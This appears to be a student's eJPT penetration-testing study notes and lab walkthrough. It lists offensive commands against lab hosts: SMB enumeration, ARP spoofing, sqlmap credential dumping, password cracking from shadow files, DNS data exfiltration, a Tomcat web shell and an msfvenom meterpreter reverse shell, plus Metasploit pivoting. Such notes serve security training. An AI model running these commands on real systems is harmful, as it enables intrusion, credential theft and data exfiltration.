## eJPT 🛠

Hey Hai, This is just a walkthrough and kinda recap of what in learnt during my INE prep course for Ejpt

### Inbuilt Labs
#### HTTPS Traffic Sniffing
- Once can actually sniff HTTP traffic only in clear using wireshark, we cant examine the HTTPS traffic
- Follow TCP Stream 
#### Find the Secret Server
- sudo ip  route add 192.168.222.0/24 via  10.175.34.1     [sudo ip route add ip/subnet via gateway]
- sudo ip route add 0.0.0.0/0 via 192.168.1.1
#### Data Exfiltration
- Configure the DNS server as attcker IP for Victim machine
- https://github.com/TryCatchHCF/PacketWhisper
- Open python server on attacker machine
- Download the zip on victim machine and run it
- We are good to exflitrate data ;)

#### Burp
- Inspect the website, from that we can able to discover robots.txt
- Using sniper from burp, check all the directories availibility
- Which reveals connections directory as 200, and ?debug is parameter that we came around robots.txt
- Playing around with parameter reveals it can only be set to true
- Set it to true, gives sensitive information back
- Fixing the In Scope
- Target > Site map tab > Spider this host
- Try to bypass the login, using intercept or any other means
- Intruder option and thier positions to attack
#### Null Sessions
- nmblookup -A ip-address
- smbclient -L //10.10.21.9 -N
- enum -S 10.1.25.26    [-S for shares; -U for users; -P for password policy;]
-  nmblookup -A 10.10.10.10
-  smbclient -L //10.10.10.10 -N (list shares)
-  smbclient //10.10.10.10/share -N (mount share)
-  enum4linux -a 10.10.10.10
-  smbmap -H demo.ine.local
-  smbclient //demo.ine.local/raymond -N   [check for every individual user]
-  enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local
#### ARP Spoofing
- echo 1 > /proc/sys/net/ipv4/ip_forward
- arpspoof -i tap0 -t 10.13.37.100 -r 10.13.37.101 [t for ]

#### Scanning and OS Fingerprinting
- fping -a -g 10.142.111.0/24 2> /dev/null
- nmap -sn -n 10.142.111.*    [There is probably a host that does not respond to ICMP echo requests, but that has a service listening on the network.]
- nmap -sS 10.142.111.1,6,48,96,99,100,213  [SYN Scan on Alive Hosts]
#### Nessus
- Advanced Customized Scan
- DISCOVERY -> Host Discovery settings -> Use Fast Network Discovery
#### Dirbuster
- dirb http://172.16.64.140/project/ -u admin:admin 
- gobuster dir -t 50 --w /usr/share/wordlists/dirb/common.txt --url http://172.16.64.81/ -x /,php,txt,bak,old,html,xx
- ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.64.81/FUZZ
#### Sql Injections
- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 --dbs --dump
- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D admin --tables
- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D admin -T login --coloumns
- sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D admin -T login -C username,password,logintime
- Intercept the request using burp, save it to req.txt
- sqlmap -r req.txt -p title  -> focusing cookie based sessions and multi-parameter based queries
#### Brute Force
- hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid Credentials" -L  /usr/share/username.lst -P /usr/share/pass.lst -f -V
- unshadow passwd shadow > hashestocrack
- john hashestocrack     ->password      (username)
- /etc/login.defs  -> to check hashin used for passwords
- hashcat -m 1800 -a 0 admin.hash /root/Desktop/wordlists/1000000-password-seclists.txt
### The Black Box Walkthrough's : Box 1

#### Machine 1
- fping -a -g network id with mask 2>/dev/null
- naabu -p - ip address
- sudo nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- 172.16.64.140 -v  
- tomcat Enumeration http:ip:port/manager/html  ->   [tomcat:s3cret]
- Which helps you to upload a .war file and deploy it on the web-server [jsp web shell]
- https://github.com/BustedSec/webshell/blob/master/webshell.war
- This will lead to RCE, confirimg the base os is linux
- Creating a meterpreter payload and listen using metasploit
-  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.16.64.10 LPORT=3211 -f elf > meter.elf
-  rename .elf to .war upload it, delpoy and this file can be relocated at /var/lib/tomcat8/webapps
-  mv /var/lib/tomcat8/webapps/meter.war /tmp/meter ls /tmp/meter chmod +x /tmp/meter
-  reverse shell at meterpreter listener

#### Machine 2
- sudo nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- 172.16.64.140 -v  
- webserver on port 80
- dirb -u dirb http://172.16.64.140/  -> discovery a directory project, which requires uname and pass [rnadom pass admin:admin [correct]]
- dirb http://172.16.64.140/project/ -u admin:admin   [for further directory enum]
- revealed the flag path and DB credentials for next machine [fooadmin:fooadmin]
#### Machine 3
- Metasploit is ur bestie
- Search metasploit for sql version for scanners or exploits
- use auxiliary/scanner/mssql/mssql_login  [login check/bruteforce]
- use auxiliary/admin/mssql/mssql_enum     [enumeration]
- use exploit/windows/mssql/mssql_payload  [exploit]
- Gives us a meterpreter session

### The Black Box Walkthrough's : Remastered 1
#### Machine 1
- Enumeration reveals it's using V-CMS 1.0
- Search Metasploit, there will be an open exploit
- use exploit/linux/http/vcms_upload
- As mentioned it the question, the vcms server is connected to some other webserver on some other network

#### Machine 2
- cat /etc/hosts will reveal the other web server info/ or ifconfig will also gives info about the other network
- But, still we wont be able to ping the other network subnet
- run autoroute -s 192.69.228.0 -n 255.255.255.0 -> this adds route automatically to the meterprrter session
- route add 192.69.228.0 255.255.255.0 1  -> you can also use this where "1" is the meterpreter session id
- use auxiliary/scanner/portscan/tcp
- set PORTS 80, 8080, 445, 21, 22
- set RHOSTS 192.69.228.3-10
- exploit
- This will do a portscan on the remote network and reveals the open ports
- Then we need to portforward our local port to the remote port do a nmap scan
- portfwd add -l 1234 -p 21 -r 192.69.228.3  -> l [local port] p [parayvalla port] r [remote Ip]
- portfwd add -L [attacker machine IP] -l listening_port -p 80 -r [victim machine IP]
- nmap -sS -sV -p 1234 localhost
- This reveals a ftp service and version, using metasploit, we can find a inbuilt exploit, then boo tada


















